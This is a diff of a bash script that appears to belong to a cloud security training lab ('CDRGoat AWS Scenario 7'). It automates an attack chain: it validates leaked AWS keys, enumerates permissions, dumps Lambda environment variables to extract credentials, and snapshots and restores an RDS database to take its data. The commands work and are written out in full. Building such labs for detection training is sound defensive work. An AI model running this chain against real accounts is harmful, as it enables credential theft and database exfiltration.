@@ -42,32 +42,20 @@ spin_start() {
 }
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
-banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 7               ===" "${RESET}"
-  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
-  printf "  • Step 1. Configuring AWS credentials\n"
-  printf "  • Step 2. Permission enumeration for leaked credentials\n"
-  printf "  • Step 3. Discovering Lambda functions\n"
-  printf "  • Step 4. Use extracted STREAMGOAT creds to snapshot and restore RDS\n"
-  
+try() {
+  local desc="$1"; shift
+  local rc
+  set +e
+  "$@" >/dev/null 2>&1
+  rc=$?
+  set -e
+  if [ $rc -eq 0 ]; then
+    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
+  else
+    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
+  fi
 }
-banner
 
-#############################################
-# Preflight checks (no changes to your logic)
-#############################################
-step "Preflight checks"
-missing=0
-for c in aws curl jq zip mysql; do
-  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
-done
-[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
-
-read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
-#############################################
-# Step 1. Configuring AWS credentials
-#############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials to use awscli  ===" "${RESET}"
 is_valid_keys() {
   local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
   local rc=0 out
@@ -95,6 +83,34 @@ is_valid_keys() {
   return 0
 }
 
+banner() {
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 7               ===" "${RESET}"
+  printf "%sLeaked Keys → Lambda Credential Extraction → RDS Snapshot → Data Exfiltration%s\n\n" "${GREEN}" "${RESET}"
+  printf "This automated attack script will:\n"
+  printf "  • Step 1. Configure AWS credentials\n"
+  printf "  • Step 2. Enumerate permissions for leaked credentials\n"
+  printf "  • Step 3. Discover Lambda functions and extract credentials\n"
+  printf "  • Step 4. Use extracted creds to snapshot and restore RDS\n"
+}
+banner
+
+#############################################
+# Preflight checks
+#############################################
+step "Preflight checks"
+missing=0
+for c in aws jq mysql; do
+  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
+done
+[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
+
+read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Step 1. Configuring AWS credentials
+#############################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials to use awscli  ===" "${RESET}"
+
 step "Starting point configuration"
 while :; do
   read -r -p "Enter leaked AWS key: " AWSKEY_USER
@@ -106,8 +122,8 @@ while :; do
     err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
   fi
 done
+
 printf "\n"
-read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -116,27 +132,12 @@ printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
 printf "This scenario demonstrates how Lambda environment variables\n"
 printf "can leak credentials, enabling RDS snapshot attacks.\n\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 2. Permission enumeration for leaked credentials
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
-
-# init colors (portable)
-
-try() {
-  local desc="$1"; shift
-  local rc
-  set +e
-  "$@" >/dev/null 2>&1
-  rc=$?
-  set -e
-  if [ $rc -eq 0 ]; then
-    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
-  else
-    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
-  fi
-}
 
 # Identity/context
 try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
@@ -156,9 +157,7 @@ try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --pro
 try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
-printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
 printf "\n"
-read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -169,6 +168,7 @@ printf "Lambda functions may contain sensitive information:\n"
 printf "  • Credentials in environment variables\n"
 printf "  • Database connection strings\n"
 printf "  • API keys and secrets\n\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Tempdir + cleanup helpers (global for script)
@@ -194,11 +194,11 @@ printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3: Discovering Lambda function
 spin_start "Listing functions"
 LAMBDA_NAMES=$(aws lambda list-functions --profile "$PROFILE" --output json \
   | jq -r '.Functions[].FunctionName' \
-  | grep -E '^StreamGoat-Lambda-' || true)
+  | grep -E '^StreamGoat-aws7-Lambda-' || true)
 spin_stop
 
 if [ -z "$LAMBDA_NAMES" ]; then
-  err "No StreamGoat-Lambda-* functions found with this profile"
+  err "No StreamGoat-aws7-Lambda-* functions found with this profile"
   printf "\n(If you expect functions, verify permissions include lambda:ListFunctions and lambda:GetFunction)\n"
 else
   ok "Found the following StreamGoat Lambda(s):"
@@ -280,16 +280,12 @@ for fn in $LAMBDA_NAMES; do
     info "Skipping download — no Code.Location available"
   fi
 
-  printf "\n"
-  read -r -p "The function seems to be used for backuping and restoring RDS assets. At the same time it is using some environmantal variables. Let's try to grab them. Press Enter to proceed (or Ctrl+C to abort)..."
-  printf "\n"
-
   ENV_VARS_RAW=$(printf "%s" "$FUNC_JSON" | jq -r '.Configuration.Environment.Variables // {}' 2>/dev/null || echo '{}')
   if [ "$ENV_VARS_RAW" = "{}" ] || [ -z "$ENV_VARS_RAW" ]; then
     info "No environment variables exposed to caller / none present"
   else
     info "Environment variables (as returned by get-function Configuration.Environment.Variables):"
-    printf "%s\n" "$ENV_VARS_RAW" | jq -r 'to_entries[] | "\(.key)=\(.value)"' 
+    printf "%s\n" "$ENV_VARS_RAW" | jq -r 'to_entries[] | "\(.key)=\(.value)"'
   fi
 
 done
@@ -314,7 +310,7 @@ printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 4: Use extracted STREAMGOAT cr
 
 # Path to JSON file from Step 3 that contained environment variables
 # Adjust if needed; here we assume you saved get-function output to /tmp/streamgoat-$$/<function>.get-function.json
-LATEST_FUNC_JSON=$(find /tmp/streamgoat-* -type f -name "StreamGoat-Lambda-*.get-function.json" -print0 2>/dev/null \
+LATEST_FUNC_JSON=$(find /tmp/streamgoat-* -type f -name "StreamGoat-aws7-Lambda-*.get-function.json" -print0 2>/dev/null \
   | xargs -0 ls -1t 2>/dev/null \
   | head -n1 || true)
 
@@ -333,7 +329,7 @@ if [ -z "$STREAMGOAT_AK" ] || [ -z "$STREAMGOAT_SK" ] || [ -z "$RDS_IDENTIFIER" 
   exit 1
 fi
 
-# configure a new AWS CLI profile for the Lambda’s embedded credentials
+# configure a new AWS CLI profile for the Lambda's embedded credentials
 
 aws configure set aws_access_key_id     "$STREAMGOAT_AK" --profile "$PROFILE"
 aws configure set aws_secret_access_key "$STREAMGOAT_SK" --profile "$PROFILE"
@@ -487,16 +483,16 @@ final_cleanup() {
       err "Failed to delete RDS instance: $NEWDB_ID"
     fi
   fi
-  
+
   # --[ 3. Remove all matching snapshots ]
   if [ -n "${RDS_IDENTIFIER:-}" ]; then
     step "Searching for snapshots with prefix: ${RDS_IDENTIFIER}-"
-    
+
     SNAP_IDS=$(aws rds describe-db-snapshots \
       --profile "$PROFILE" \
       --query "DBSnapshots[?starts_with(DBSnapshotIdentifier, \`${RDS_IDENTIFIER}-\`)].DBSnapshotIdentifier" \
       --output text)
-  
+
     if [ -z "$SNAP_IDS" ]; then
       info "No matching snapshots found for cleanup"
     else
